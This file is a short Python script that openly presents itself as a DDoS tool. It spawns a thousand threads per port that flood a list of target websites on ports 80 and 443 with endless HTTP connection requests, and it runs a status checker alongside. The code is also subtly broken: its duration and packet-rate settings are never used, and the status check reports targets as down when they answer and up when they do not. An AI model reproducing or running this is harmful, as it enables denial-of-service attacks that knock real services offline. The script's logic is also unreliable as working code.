import socket
import threading
import time
import random

# Configuration
targets = ['example1.com', 'example2.com', 'example3.com']  # List of target websites
port = [80, 443]  # Ports to target
duration = 60  # Duration in seconds
threads = 1000  # Number of threads
packets_per_second = 10000000  # 10 million packets per second

def ddos(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except:
            pass

def notify_status(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            print(f"[+] {target} on port {port} is down")
            break
        except:
            print(f"[+] {target} on port {port} is up")
            time.sleep(1)

def main():
    print(f"[+] Starting DDoS attack on multiple targets for {duration} seconds...")
    start_time = time.time()

    for target in targets:
        for p in port:
            for _ in range(threads):
                threading.Thread(target=ddos, args=(target, p)).start()

            threading.Thread(target=notify_status, args=(target, p)).start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()